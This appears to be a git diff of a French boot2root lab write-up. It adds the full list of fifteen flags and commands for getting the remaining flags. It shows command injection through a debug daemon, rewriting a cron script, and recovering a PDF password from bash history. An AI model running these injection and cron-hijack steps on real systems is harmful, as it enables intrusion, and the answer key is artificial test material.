@@ -18,7 +18,7 @@ Toutefois on a une visu de l'escalade a realiser dans la description de l'applia
 |   4   | sophie      | 🧠  |   ✅  [Clic](./write_up_3.md#d-prendre-le-controle-sur-sophie)|
 |   5   | ol          | 🛡️  |   ✅  [Clic](./write_up_3.md#e-prendre-le-controle-sur-ol)|
 |   6   | root        | 👑  |   ✅  [Clic](./write_up_3.md#f-escalade-vers-root)  |
-|*bonus*| xavier      |     |   ❌  |
+
 
 ### RECUPERATION DES `.key_part`
 
@@ -57,16 +57,21 @@ Le script d'encryption de `paco` : `encrypt.py` nous explique qu'il nous faudra 
 ### FLAGS  
 | Number | Flag                                             |
 |--------|--------------------------------------------------|
-|   1    | FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}      |
-|   2    | FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}                 |
-|   3    | FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}             |
-|   4    | FLAG{h4l_r3v13ws_3v3ry_4pp34l}                   |
-|   5    | FLAG{b4sh_h1st0ry_1s_4_d14ry}                    |
-|   6    | FLAG{udp_1s_4_wh1sp3r}                           |
-|   7    |                                                  |
-|   8    |                                                  |
-|   9    |                                                  |
-|   10   |                                                  |
+|   1    | [FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}](#1-flagn1c3_try_but_th4ts_n0t_h0w_th1s_w0rks)      |
+|   2    | [FLAG{d3l3t3d_us3rs_l34v3_tr4c3s}](#2-flagd3l3t3d_us3rs_l34v3_tr4c3s)                 |
+|   3    | [FLAG{x4v13r_w4s_3r4s3d_but_n0t_g0n3}](#3-flagx4v13r_w4s_3r4s3d_but_n0t_g0n3)             |
+|   4    | [FLAG{h4l_r3v13ws_3v3ry_4pp34l}](#4-flagh4l_r3v13ws_3v3ry_4pp34l)                   |
+|   5    | [FLAG{b4sh_h1st0ry_1s_4_d14ry}](#5-flagb4sh_h1st0ry_1s_4_d14ry)                    |
+|   6    | [FLAG{udp_1s_4_wh1sp3r}](#6-flagudp_1s_4_wh1sp3r)                           |
+|   7    | [FLAG{r3c0n_1s_king}](#7-10-www-data-flags)                              |
+|   8    | [FLAG{g1t_n3v3r_f0rg3ts}](#7-10-www-data-flags)                          |
+|   9    | [FLAG{s3m1_bl1nd_st1ll_burns}](#7-10-www-data-flags)                     |
+|   10   | [FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}](#7-10-www-data-flags)             |
+|   11   | [FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}](#11-flagp4c0_l3ft_th3_k3ys_und3r_th3_m4t)           |
+|   12   | [FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}](#12-flagd3bug_m0d3_1s_4_f34tur3_r1ght)             |
+|   13   | [FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}](#13-flagw1l_kn3w_f1rst_n0b0dy_l1st3n3d)             |
+|   14   | [FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}](#14-flagcr0n_j0bs_4r3_tr4ps_4nd_g1fts)             |
+|   15   | [FLAG{m0ul1n3tt3_w4a_n3v3r_ju5t_4_scr1pt}](#15-flagm0ul1n3tt3_w4a_n3v3r_ju5t_4_scr1pt)             |
 
 #### #1 **FLAG{n1c3_try_but_th4ts_n0t_h0w_th1s_w0rks}**  
 
@@ -176,6 +181,150 @@ Le secret est tout simplement accessible depuis un endpoint HTTP local sans auth
 - Recuperation : 
     - `FLAG{udp_1s_4_wh1sp3r}`
 
+> [!NOTE]
+> Les flags qui vont suivre sont certainement les flags de la partie mandatory. Ils ont ete decouverts sur le tard, une fois que j'avais obtenu une session `root`. Je me suis mis a chercher les flags manquants a partir d'ici.
+
+#### Interlude : flagd.service
+
+Une fois l'acces root obtenu via la chaine de privesc, l'exploration du systeme depuis le contexte `root`, une chose que j'avais eludee jusqu'ici m'a saute aux yeux : l'existence d'un service de distribution de flags par UID.
+
+Dans le repertoire : `/etc/` on trouve `/etc/flagd` qui contient un fichier `flagd.conf` : 
+
+```txt
+www|33|FLAG{r3c0n_1s_k1ng}
+FLAG{g1t_n3v3r_f0rg3ts}
+FLAG{s3m1_bl1nd_st1ll_burns}
+FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}|not www-data. the web frontend runs as www-data — get a shell via the semi-blind SSTI on /evaluate (header X-Debug-Render: true) or the LFI->RCE on /api/debug.
+paco|1001|FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}|.env.old in /home/paco was never cleaned up. it holds paco's ssh password.
+wil|1002|FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}|hal9042d listens on 127.0.0.1:7042 and runs as wil. debug mode was never disabled — strings the binary.
+sophie|1003|FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}|wil kept an encrypted ssh key for sophie (~wil/.ssh/id_rsa_sophie.enc). the passphrase is the most common one there is.
+ol|1004|FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}|ol's cron runs /home/ol/scripts/check.sh as ol every 5 minutes. who can write it?
+```
+
+D'ici, on peut supposer qu'un service associe doit tourner, ce qu'on confirme : 
+
+```bash
+rootbash-5.2# systemctl status flagd
+● flagd.service - HAL9042 flag broker (uid-gated unix sockets)
+     Loaded: loaded (/etc/systemd/system/flagd.service; enabled; preset: enabled)
+     Active: active (running) since Mon 2026-10-12 12:57:11 UTC; 16min ago
+   Main PID: 649 (flagd)
+      Tasks: 1 (limit: 2263)
+     Memory: 232.0K (peak: 1.3M)
+        CPU: 5ms
+     CGroup: /system.slice/flagd.service
+             └─649 /usr/local/sbin/flagd
+
+Oct 12 12:57:11 hal9042 systemd[1]: Started flagd.service - HAL9042 flag broker (uid-gated u>
+lines 1-11/11 (END)
+```
+
+Le nom du service `(uid-gated unix sockets)` explicite le mecanisme d'access control utilise.
+
+Le binaire n'etant pas strippe (cad qu'il contient des infos de debug) on peut donc extraire les symboles via `strings`, c'est le meme mecanisme utilise pour le backup de `xavier`.
+
+```bash
+rootbash-5.2# strings /usr/local/sbin/flagd
+
+getsockopt
+accept
+bind / listen / socket
+%s/%s.sock <-- .sock sont ici : /run/flagd
+ERROR: cannot read peer credentials
+ERROR: unauthorized. expected uid=%u, got uid=%u.
+```
+**Ce qui se passe concretement**: `flagd`cree un socket Unix par utilisateur, `SOPEER_CRED` permet a ce service de verifier l'identite reelle du processus client, il compare l'UID de la connexion au socket et la compare a celle du fichier de configuration en refusant les connexions qui ne correspondent pas.  
+
+**Mecanisme de recuperation**: lancer une connexion au socket via `nc` comme suit : 
+
+```bash
+nc -U /run/flagd/<user>.sock
+```
+
+C'est en gros l'equivalent du `getflag` qu'on avait pu voir dans SnowCrash il y a un bout de temps. 
+
+#### #7-10 **www-data FLAGS**
+
+- En utilisant le service `flagd` donc :
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ ./boot2root_scripts/post_evaluate.sh "nc -U /run/flagd/www.sock"
+Project under evaluation: FLAG{r3c0n_1s_k1ng}
+FLAG{g1t_n3v3r_f0rg3ts}
+FLAG{s3m1_bl1nd_st1ll_burns}
+FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
+```
+
+#### 11 **FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}**
+
+- En utlisant le service `flagd` depuis une connexion a la session de `paco` pour avoir le bon UID : 
+
+```bash
+paco@hal9042:~$ nc -U /run/flagd/paco.sock
+FLAG{p4c0_l3ft_th3_k3ys_und3r_th3_m4t}
+```
+
+#### 12 **FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}**
+
+- En utilisant le pivot `paco->wil` : 
+
+```bash
+paco@hal9042:~$ echo "DEBUG:nc -U /run/flagd/wil.sock" | nc 127.0.0.1 7042
+HAL9042 evaluation daemon — v0.4 (build dev)
+Submit a project name to evaluate. One line per request.
+> FLAG{d3bug_m0d3_1s_4_f34tur3_r1ght}
+```
+
+#### 13 **FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}**
+
+- Une fois connecte a la session de `sophie` :
+
+```bash
+sophie@hal9042:~$ nc -U /run/flagd/sophie.sock
+FLAG{w1l_kn3w_f1rst_n0b0dy_l1st3n3d}
+```
+
+#### 14 **FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}**
+
+- Pour recuperer ce flag, on va exploiter le script `check.sh`, on va enumerer les commandes a jouer : 
+
+```bash
+1. echo 'DEBUG: echo "#!/bin/bash" > /tmp/test' | nc 127.0.0.1 7042
+2. echo 'DEBUG: echo "LOG=/var/log/hal9042/check.log" >> /tmp/test' | nc 127.0.0.1 7042
+3. echo 'DEBUG: echo "nc -U /run/flagd/ol.sock >> \$LOG" >> /tmp/test' | nc 127.0.0.1 7042
+4. echo 'DEBUG: echo "$(cat /tmp/test)" > /home/ol/scripts/check.sh' | nc 127.0.0.1 7042 
+```
+
+- Au `cat /var/log/hal9042/check.log` on retrouve : `FLAG{cr0n_j0bs_4r3_tr4ps_4nd_g1fts}`
+
+#### 15 **FLAG{m0ul1n3tt3_w4a_n3v3r_ju5t_4_scr1pt}**
+
+Ce dernier flag est contenu dans le PDF scelle par Sophie a destination du board. Il nous en est fait mention a plusieurs endroits via des indices.  
+Le dit PDF est accessible du moment ou l'on a un shell `root` sous le nom : `PROJET_FORK_HAL9042.pdf`  
+
+Pour pouvoir l'ouvrir facilement depuis un environnement desktop, je l'ai copie ici `/home/paco`. Dans un premier temps on `chmod 777` le pdf.
+
+Depuis ma vm kali : `scp -P 6060 paco@10.0.2.2:/root/PROJET_FORK_HAL9042.pdf ~/Desktop`. 
+
+Quand on tente d'ouvrir le pdf, on nous demande un mot de passe. Sachant que c'est `sophie` qui a scelle ce pdf, on consulte son `.bash_history` : 
+
+```bash
+sophie@hal9042:~$ cat /home/sophie/.bash_history
+ls -la drafts/
+cat inbox/board_launch_order.txt
+# board wants the FORK doc restricted before it goes to /root
+qpdf --encrypt "Pr0j3tF0rk_J14" "Pr0j3tF0rk_J14" 256 -- fork_draft.pdf PROJET_FORK_HAL9042.pdf
+sudo mv PROJET_FORK_HAL9042.pdf /root/
+shred -u fork_draft.pdf
+# quick check the internal telemetry endpoint is still up (F14 hint)
+curl -s "http://127.0.0.1:9000/internal/telemetry"
+vi drafts/mail_ol_sorry_unsent.txt
+clear
+```
+On peut voir le mot de passe que `sophie` a utilise pour seal le pdf : `Pr0j3tF0rk_J14`
+
+On peut maintenant ouvrir le pdf, le lire, et recuperer le dernier flag.
 
 ## KILL CHAIN
 
